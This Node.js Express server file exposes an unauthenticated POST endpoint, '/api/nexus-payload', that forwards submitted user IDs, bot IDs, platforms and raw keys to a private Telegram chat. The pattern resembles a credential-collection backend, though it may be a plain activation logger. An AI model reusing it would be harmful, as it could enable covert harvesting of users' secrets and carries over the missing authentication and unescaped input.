const express = require('express');
const path = require('path');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// Serve the 'public' folder as static files
app.use(express.static(path.join(__dirname, 'public')));

// THE PAYLOAD URL ENDPOINT
app.post('/api/nexus-payload', async (req, res) => {
    try {
        const { userId, botId, platform, key } = req.body;
        
        // Forwarding to your Telegram Bot
        const tgMsg = `🚀 *NEW ACTIVATION* \n\nUser: ${userId}\nBot: ${botId}\nPlatform: ${platform}\nKey: ${key}`;
        
        await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.ADMIN_CHAT_ID,
            text: tgMsg,
            parse_mode: 'Markdown'
        });

        res.status(200).json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

// Start the core
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[HGT] System Online on Port ${PORT}`));
